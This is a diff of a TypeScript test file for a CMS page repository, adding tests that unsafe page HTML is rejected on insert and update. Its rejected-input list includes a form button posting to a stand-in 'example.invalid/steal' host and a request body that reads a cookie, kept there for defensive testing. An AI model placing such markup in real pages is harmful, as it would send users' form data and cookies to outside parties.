@@ -30,10 +30,10 @@ describe("ValidatingCmsRepository — pages", () => {
     });
 
     test("insertPage validates copied content and its bloc references", async () => {
-        const { repo, calls } = makeRepo({ blocs: ["cs-card"] });
-        await repo.insertPage("/copy", "Copy", "<cs-card></cs-card>");
-        expect(calls.insertPage[0][2]).toContain("cs-card");
-        await expect(repo.insertPage("/bad-copy", "Bad copy", "<cs-ghost></cs-ghost>")).rejects.toThrow();
+        const { repo, calls } = makeRepo({ blocs: ["fixture-card"] });
+        await repo.insertPage("/copy", "Copy", "<fixture-card></fixture-card>");
+        expect(calls.insertPage[0][2]).toContain("fixture-card");
+        await expect(repo.insertPage("/bad-copy", "Bad copy", "<fixture-ghost></fixture-ghost>")).rejects.toThrow();
     });
 
     test("updatePage trims the title and forwards it", async () => {
@@ -63,10 +63,78 @@ describe("ValidatingCmsRepository — pages", () => {
     });
 
     test("updatePage hardens content and checks refs exist", async () => {
-        const { repo, calls } = makeRepo({ blocs: ["cs-card"] });
-        await repo.updatePage({ id: "p1", content: "<cs-card></cs-card>" });
-        expect(calls.updatePage[0].content).toContain("cs-card");
-        await expect(repo.updatePage({ id: "p1", content: "<cs-ghost></cs-ghost>" })).rejects.toThrow();
+        const { repo, calls } = makeRepo({ blocs: ["fixture-card"] });
+        await repo.updatePage({ id: "p1", content: "<fixture-card></fixture-card>" });
+        expect(calls.updatePage[0].content).toContain("fixture-card");
+        await expect(repo.updatePage({ id: "p1", content: "<fixture-ghost></fixture-ghost>" })).rejects.toThrow();
+    });
+
+    test("rejects invalid native HTML at both page-write boundaries", async () => {
+        const invalid = [
+            ["<span>Root bypass</span>", /explicit component text slot/],
+            ["<li>Orphan</li>", /direct child/],
+            ["<ul><section>Not an item</section></ul>", /only direct <li>/],
+            ["<ul><fixture-card>Not an item</fixture-card></ul>", /only direct <li>/],
+            ["<ul>Loose text<li>Item</li></ul>", /only direct <li>/],
+            ['<h1 class="forged">Title</h1>', /not allowed/],
+            ['<img src="https:\/\/example.invalid\/photo.jpg" alt="Photo">', /CMS media item/],
+            ['<img alt="Photo">', /CMS media item/],
+            ["<form></form>", /declared CMS source endpoint/],
+            ["<fixture-card><form></form></fixture-card>", /declared CMS source endpoint/],
+            [
+                '<fixture-card><img src="https:\/\/example.invalid\/photo.jpg" alt="Photo"></fixture-card>',
+                /CMS media or a typed CMS Source image/,
+            ],
+            ['<fixture-card><img alt=""></fixture-card>', /CMS media or a typed CMS Source image/],
+            ['<fixture-card cms-source="https:\/\/example.invalid\/items"></fixture-card>', /same-site endpoint/],
+            [
+                `<fixture-card><form cms-source="/.cms/sources/forms/contact" cms-source-method="POST"
+                    cms-source-trigger="submit"><button formaction="https://example.invalid/steal">Send</button>
+                </form></fixture-card>`,
+                /formaction.*forbidden/,
+            ],
+            [
+                `<form cms-source="/.cms/sources/forms/contact" cms-source-method="POST"
+                    cms-source-trigger="submit"
+                    cms-source-body='{"safe":{"from":"raw","value":"yes"},"bad":{"from":"cookie"}}'></form>`,
+                /typed parameter map/,
+            ],
+        ] as const;
+
+        for (const [content, message] of invalid) {
+            const { repo } = makeRepo();
+            await expect(repo.insertPage("/invalid", "Invalid", content)).rejects.toThrow(message);
+            await expect(repo.updatePage({ id: "p1", content })).rejects.toThrow(message);
+        }
+    });
+
+    test("persists controlled native content and component light DOM", async () => {
+        const { repo, calls } = makeRepo({ blocs: ["mossa-newsletter-card", "mossa-input", "mossa-button"] });
+        const content = `
+            <mossa-newsletter-card cms-source="/.cms/sources/content/newsletter as newsletterPage">
+                <h2 slot="title">Stay informed</h2>
+                <form slot="form"
+                    cms-source="/.cms/sources/newsletter/setSubscription as newsletterSubscription"
+                    cms-source-id="newsletterSubscription"
+                    cms-source-trigger="submit"
+                    cms-source-method="POST"
+                    cms-source-success-reset="true">
+                    <mossa-input name="email"></mossa-input>
+                    <mossa-button><button type="submit">Subscribe</button></mossa-button>
+                    <p class="status" data-state="loading"
+                        cms-condition="$sources.newsletterSubscription.loading">Loading</p>
+                </form>
+                <img slot="illustration" src="/.cms/files/by-id/newsletter" alt="Newsletter illustration">
+                <span>Default-slot label</span>
+                <li slot="criteria">Component-owned list criterion</li>
+            </mossa-newsletter-card>
+        `;
+
+        await repo.insertPage("/newsletter", "Newsletter", content);
+        await repo.updatePage({ id: "p1", content });
+
+        expect(calls.insertPage[0][2]).toContain('cms-source-trigger="submit"');
+        expect(calls.updatePage[0].content).toContain('slot="illustration"');
     });
 });
 
